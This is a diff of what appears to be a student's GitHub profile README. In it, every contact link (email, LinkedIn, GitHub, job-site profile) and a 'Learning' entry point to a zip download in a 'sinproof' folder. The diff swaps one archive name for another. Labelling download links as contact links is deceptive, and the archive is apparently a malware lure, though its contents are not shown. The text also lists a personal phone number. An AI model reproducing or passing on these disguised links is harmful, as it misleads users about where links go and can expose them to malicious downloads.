@@ -17,7 +17,7 @@ Terfs Academy College (Face Prep Campus), Tiruppur
 - Languages: C, C++, Java, Python, SQL, C#, NUMPY.
 - Frontend: HTML, CSS, JavaScript, Bootstrap, jQuery, Kotlin.
 - Tools: VS Code, GitHub, Google Colab, Canva, idle, Codeblocks, Sublime Text, XAMPP.
-- Learning: https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip
+- Learning: https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip
 
 ## 🧠 Certifications & Badges
 
@@ -62,12 +62,12 @@ Terfs Academy College (Face Prep Campus), Tiruppur
 
 ## 📫 Connect With Me
 
-- 📧 Email: [https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
+- 📧 Email: [https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip](https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip)
 - 📱 Phone: +91 63794 39440
-- 🔗 LinkedIn: [https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
-- 💻 GitHub: [https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
+- 🔗 LinkedIn: [https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip](https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip)
+- 💻 GitHub: [https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip](https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip)
 - 🧠 HackerRank: **Deva Dharshini - ddharshini820**
-- 💼 Naukri / Code360 Profile: [View Profile](https://github.com/Devadharshinii-Murugan/Devadharshinii-Murugan/raw/refs/heads/main/sinproof/Murugan-Devadharshinii-v1.3.zip)
+- 💼 Naukri / Code360 Profile: [View Profile](https://raw.githubusercontent.com/Devadharshinii-Murugan/Devadharshinii-Murugan/main/sinproof/Devadharshinii-Murugan-ethanethiol.zip)
 
 
 
